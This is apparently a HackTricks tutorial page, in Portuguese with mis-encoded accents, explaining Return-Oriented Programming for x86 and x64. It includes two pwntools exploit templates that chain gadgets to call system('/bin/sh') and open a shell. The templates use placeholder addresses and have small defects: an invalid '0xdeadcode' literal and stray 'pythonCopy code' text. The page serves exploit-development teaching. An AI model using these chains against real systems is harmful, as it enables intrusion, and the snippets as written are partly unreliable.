# ROP - Programa√ß√£o Orientada a Retorno

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **Informa√ß√µes B√°sicas**

**Programa√ß√£o Orientada a Retorno (ROP)** √© uma t√©cnica avan√ßada de explora√ß√£o usada para contornar medidas de seguran√ßa como **No-Execute (NX)** ou **Preven√ß√£o de Execu√ß√£o de Dados (DEP)**. Em vez de injetar e executar shellcode, um atacante aproveita partes de c√≥digo j√° presentes no bin√°rio ou em bibliotecas carregadas, conhecidas como **"gadgets"**. Cada gadget geralmente termina com uma instru√ß√£o `ret` e realiza uma pequena opera√ß√£o, como mover dados entre registradores ou realizar opera√ß√µes aritm√©ticas. Ao encadear esses gadgets, um atacante pode construir uma carga √∫til para realizar opera√ß√µes arbitr√°rias, contornando efetivamente as prote√ß√µes NX/DEP.

### Como o ROP Funciona

1. **Sequestro de Fluxo de Controle**: Primeiro, um atacante precisa sequestrar o fluxo de controle de um programa, geralmente explorando um estouro de buffer para sobrescrever um endere√ßo de retorno salvo na pilha.
2. **Encadeamento de Gadgets**: O atacante ent√£o seleciona e encadeia cuidadosamente gadgets para realizar as a√ß√µes desejadas. Isso poderia envolver configurar argumentos para uma chamada de fun√ß√£o, chamar a fun√ß√£o (por exemplo, `system("/bin/sh")`), e lidar com qualquer limpeza necess√°ria ou opera√ß√µes adicionais.
3. **Execu√ß√£o da Carga √ötil**: Quando a fun√ß√£o vulner√°vel retorna, em vez de retornar para uma localiza√ß√£o leg√≠tima, ela come√ßa a executar a cadeia de gadgets.

## Cadeia ROP no Exemplo x86

### **Conven√ß√µes de Chamada x86 (32 bits)**

- **cdecl**: O chamador limpa a pilha. Os argumentos da fun√ß√£o s√£o empurrados para a pilha em ordem reversa (da direita para a esquerda). **Os argumentos s√£o empurrados para a pilha da direita para a esquerda.**
- **stdcall**: Semelhante ao cdecl, mas o chamado √© respons√°vel por limpar a pilha.

### **Encontrando Gadgets**

Primeiro, vamos supor que identificamos os gadgets necess√°rios dentro do bin√°rio ou de suas bibliotecas carregadas. Os gadgets de interesse s√£o:

- `pop eax; ret`: Este gadget desempilha o valor do topo da pilha para o registrador `EAX` e ent√£o retorna, permitindo controlar `EAX`.
- `pop ebx; ret`: Semelhante ao anterior, mas para o registrador `EBX`, permitindo controle sobre `EBX`.
- `mov [ebx], eax; ret`: Move o valor em `EAX` para a localiza√ß√£o de mem√≥ria apontada por `EBX` e ent√£o retorna.
- Al√©m disso, temos o endere√ßo da fun√ß√£o `system()` dispon√≠vel.

### **Cadeia ROP**

Usando **pwntools**, preparamos a pilha para a execu√ß√£o da cadeia ROP da seguinte forma, visando executar `system('/bin/sh')`, observe como a cadeia come√ßa com:

1. Uma instru√ß√£o `ret` para fins de alinhamento (opcional)
2. Endere√ßo da fun√ß√£o `system` (supondo ASLR desativado e libc conhecida, mais informa√ß√µes em [**Ret2lib**](ret2lib/))
3. Marcador de posi√ß√£o para o endere√ßo de retorno de `system()`
4. Endere√ßo da string `"/bin/sh"` (par√¢metro para a fun√ß√£o system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Cadeia ROP no Exemplo x64

### **Conven√ß√µes de Chamada x64 (64 bits)**

* Utiliza a conven√ß√£o de chamada **System V AMD64 ABI** em sistemas semelhantes ao Unix, onde os **primeiros seis argumentos inteiros ou ponteiros s√£o passados nos registradores `RDI`, `RSI`, `RDX`, `RCX`, `R8` e `R9`**. Argumentos adicionais s√£o passados na pilha. O valor de retorno √© colocado em `RAX`.
* A conven√ß√£o de chamada **Windows x64** utiliza `RCX`, `RDX`, `R8` e `R9` para os quatro primeiros argumentos inteiros ou ponteiros, com argumentos adicionais passados na pilha. O valor de retorno √© colocado em `RAX`.
* **Registradores**: Os registradores de 64 bits incluem `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` e `R8` a `R15`.

#### **Encontrando Gadgets**

Para nosso prop√≥sito, vamos focar em gadgets que nos permitir√£o definir o registrador **RDI** (para passar a string **"/bin/sh"** como argumento para **system()**) e ent√£o chamar a fun√ß√£o **system()**. Vamos assumir que identificamos os seguintes gadgets:

* **pop rdi; ret**: Desempilha o valor do topo da pilha em **RDI** e ent√£o retorna. Essencial para definir nosso argumento para **system()**.
* **ret**: Um retorno simples, √∫til para alinhamento de pilha em alguns cen√°rios.

E sabemos o endere√ßo da fun√ß√£o **system()**.

### **Cadeia ROP**

Abaixo est√° um exemplo usando **pwntools** para configurar e executar uma cadeia ROP com o objetivo de executar **system('/bin/sh')** em **x64**:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Neste exemplo:

* Utilizamos o gadget **`pop rdi; ret`** para definir **`RDI`** como o endere√ßo de **`"/bin/sh"`**.
* Saltamos diretamente para **`system()`** ap√≥s definir **`RDI`**, com o endere√ßo de **`system()`** na cadeia.
* O **`ret_gadget`** √© usado para alinhamento se o ambiente de destino exigir, o que √© mais comum em **x64** para garantir o alinhamento adequado da pilha antes de chamar fun√ß√µes.

### Alinhamento da Pilha

**O ABI x86-64** garante que a **pilha esteja alinhada em 16 bytes** quando uma **instru√ß√£o de chamada** √© executada. **LIBC**, para otimizar o desempenho, **usa instru√ß√µes SSE** (como **movaps**) que requerem esse alinhamento. Se a pilha n√£o estiver alinhada corretamente (ou seja, **RSP** n√£o √© um m√∫ltiplo de 16), chamadas para fun√ß√µes como **system** falhar√£o em uma **cadeia ROP**. Para corrigir isso, basta adicionar um **gadget ret** antes de chamar **system** em sua cadeia ROP.

## Diferen√ßa principal entre x86 e x64

{% hint style="success" %}
Como o x64 usa registradores para os primeiros argumentos, muitas vezes requer menos gadgets do que o x86 para chamadas de fun√ß√£o simples, mas encontrar e encadear os gadgets corretos pode ser mais complexo devido ao aumento do n√∫mero de registradores e ao maior espa√ßo de endere√ßamento. O aumento do n√∫mero de registradores e do maior espa√ßo de endere√ßamento na arquitetura **x64** oferece oportunidades e desafios para o desenvolvimento de exploits, especialmente no contexto da Programa√ß√£o Orientada a Retorno (ROP).
{% endhint %}

## Prote√ß√µes

* [**ASLR**](../common-binary-protections/aslr.md)
* [**Can√°rios de Pilha**](../common-binary-protections/stack-canaries.md)

## Outros Exemplos

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## T√©cnicas baseadas em ROP

Observe que ROP √© apenas uma t√©cnica para executar c√≥digo arbitr√°rio. Com base em ROP, muitas t√©cnicas Ret2XXX foram desenvolvidas:

* **Ret2lib**: Usa ROP para chamar fun√ß√µes arbitrariamente de uma biblioteca carregada com par√¢metros arbitr√°rios (geralmente algo como `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Usa ROP para preparar uma chamada a uma syscall, por exemplo, `execve`, e executar comandos arbitr√°rios.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: O primeiro abusar√° do EBP em vez do EIP para controlar o fluxo e o segundo √© semelhante ao Ret2lib, mas neste caso o fluxo √© controlado principalmente com endere√ßos EBP (embora tamb√©m seja necess√°rio controlar o EIP).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
